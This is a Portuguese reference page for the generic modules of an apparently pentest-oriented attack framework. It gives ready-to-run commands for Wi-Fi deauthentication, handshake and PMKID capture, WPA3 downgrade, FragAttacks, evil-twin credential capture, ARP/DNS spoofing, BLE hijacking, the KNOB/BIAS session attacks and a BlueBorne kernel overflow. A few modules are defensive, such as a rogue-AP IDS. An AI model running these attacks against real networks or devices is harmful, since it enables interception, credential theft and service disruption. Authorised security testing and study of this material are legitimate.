# 08 — Módulos Generic

> Referência completa para todos os módulos `generic/*` com sintaxe completa, opções e exemplos de uso.

**Autor:** André Henrique (@mrhenrike) | União Geek

---

## generic/wifi_lab — Laboratório de Ataque Wi-Fi

### handshake_snooper

Pipeline PMKID-first + captura de handshake WPA2 via deauth.

```
use generic/wifi_lab/handshake_snooper
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
set pmkid_first true            # tenta PMKID antes de deauth (padrão: true)
set pmkid_timeout 30            # segundos para tentativa PMKID
set deauth_count 5
set capture_seconds 30
run
```

---

### wpa3_attack_suite

Suite Dragonblood WPA3 — SAE flood, CSA, Double SSID clone, downgrade.

```
use generic/wifi_lab/wpa3_attack_suite
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
# attack: downgrade | sae_flood | csa | double_ssid | timing | auto
set attack auto
set csa_harvest true            # captura PMKID/EAPOL durante janela CSA
set dry_run false
run
```

---

### fragattacks

FragAttacks CVE-2020-26140+ com detecção de capacidade HE 802.11ax.

```
use generic/wifi_lab/fragattacks
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_ip 192.168.1.1
run
# A saída mostrará o status de capacidade HE (Wi-Fi 6) na PHY da interface.
```

---

### evil_twin_workflow

Evil-twin completo com verificação opcional de captura de credencial.

```
use generic/wifi_lab/evil_twin_workflow
set target_ssid "MinhaRede"
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
set ap_interface wlan1
set deauth_interface wlan0mon
set verify_on_capture true
set handshake_capture_path /tmp/captura.cap
set captured_password s3cr3t
run
```

---

### mitm_wifi_bridge

ARP spoofing, DNS spoofing e Ghost combo (bettercap).

```
use generic/wifi_lab/mitm_wifi_bridge
# mode: ap_bridge | arp_spoof | dns_spoof | ghost_combo | ssl_strip
set mode ghost_combo
set upstream_interface eth0
set target_ip 192.168.1.100
set dns_target "*.corp.local"
set dns_redirect_ip 192.168.1.50
run
```

---

### adaptive_harvest

Coleta adaptativa de PMKID/handshake com rotação de canais guiada por score.

```
use generic/wifi_lab/adaptive_harvest
set interface wlan0mon
set channels 1,6,11
set rounds 5
set round_seconds 25
run
```

---

### wardriving_deauth_loop

Wardriving automatizado: ciclos scan → deauth → captura.

```
use generic/wifi_lab/wardriving_deauth_loop
set interface wlan0mon
set scan_seconds 30
set deauth_burst 5
set cycles 3
run
```

---

### wireless_ids

IDS passivo: aprendizado de baseline de BSSID + detecção de rogue AP.

```
use generic/wifi_lab/wireless_ids
set baseline_csv /caminho/para/baseline_airodump.csv
set current_csv /caminho/para/atual_airodump.csv
set min_signal -85
run
```

---

## generic/pcap — Análise de PCAP

### pcap_sql_workspace

Workspace SQLite para metadados de PCAP e notas de analista.

```
use generic/pcap/pcap_sql_workspace
set db_path .log/pcap_workspace.db
# action: init | import | list
set action init
run

set action import
set pcap_path /caminho/para/captura.pcap
set label "Captura lab TrOll_2.4GHz 2026-04-08"
run

set action list
run
```

---

## generic/bluetooth — Bluetooth / BLE

### ble_btlejack

BLE sniff, jam e hijack via BTLEJack.

```
use generic/bluetooth/ble_btlejack
# action: sniff | jam | hijack
set action sniff
set channel 37
set output_pcap .log/ble_capture.pcap
run
```

### bt_session_attack

Ataques de sessão KNOB, BIAS, BLUFFS.

```
use generic/bluetooth/bt_session_attack
set target_addr AA:BB:CC:DD:EE:FF
# attack: knob_bruteforce | bias | bluffs
set attack knob_bruteforce
set entropy 7
set allow_unsafe_knob false     # guarda: bloqueia entropy < 7
run
```

### blueborne_attack

BlueBorne L2CAP overflow com perfis de offset de kernel.

```
use generic/bluetooth/blueborne_attack
set target_addr AA:BB:CC:DD:EE:FF
# kernel_profile: ubuntu_16_04 | ubuntu_18_04 | android_7_bluez | android_8_bluez
set kernel_profile ubuntu_18_04
run
```

---

## generic/external — Bridges para Ferramentas Externas

### bruce_serial_bridge

Engine de fluxo serial para firmware Bruce (ESP32). Sintaxe completa:

```
use generic/external/bruce_serial_bridge
set serial_port /dev/ttyACM0
set baudrate 115200
# Perfis de fluxo predefinidos:
set flow_profile capture_handshake_flow
# Outros perfis:
#   baseline_status_flow, wifi_menu_navigation_flow, sniffer_capture_flow,
#   wifi_attack_lab_flow, deauth_clone_verify_flow, evil_portal_karma_flow,
#   raw_sniffer_probe_flow, navigation_recovery_flow, wifi_bruteforce_recon_flow,
#   captive_portal_endpoint_config_flow, repeater_wisp_setup_flow,
#   external_adapter_probe_flow, webui_password_flow, target_attack_stability_flow,
#   ble_recon_spam_flow, ble_badble_recovery_flow,
#   rf_spectrum_scan_flow, rf_jammer_stability_flow
set step_delay_ms 250
set read_window_ms 1200
set retries_per_step 1
set fail_on_expect_miss false
set output_log .log/bruce_serial_bridge.log
set dry_run false
run
```

Fluxo declarativo customizado (flow_json):

```
use generic/external/bruce_serial_bridge
set serial_port /dev/ttyACM0
set flow_json [{"command":"wifi scan","expect":"#","wait_ms":1200},{"command":"nav back","repeat":2,"expect":"#"}]
run
```

---

### bruce_upstream_tracker

Navegue pelo catálogo de issues e PRs do BruceDevices/firmware.

```
use generic/external/bruce_upstream_tracker
# view: summary | top_useful | by_category | open_high | open_high_pending | open_pending
set view summary
run

set view open_pending
set limit 20
run

set view by_category
set category ble
run
```

---

### airgeddon_bridge

Bridge multi-modo para Airgeddon.

```
use generic/external/airgeddon_bridge
# mode: handshake | wps | evil_twin | pmkid | deauth | wpa3_downgrade | menu
set mode handshake
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
run
```

---

### wireless_tool_prereq_audit

Verificar se todas as ferramentas externas necessárias estão instaladas e no PATH.

```
use generic/external/wireless_tool_prereq_audit
run
```

---

*Veja [docs/FULL_CATALOG.md](../FULL_CATALOG.md) para o índice completo de módulos gerado automaticamente.*
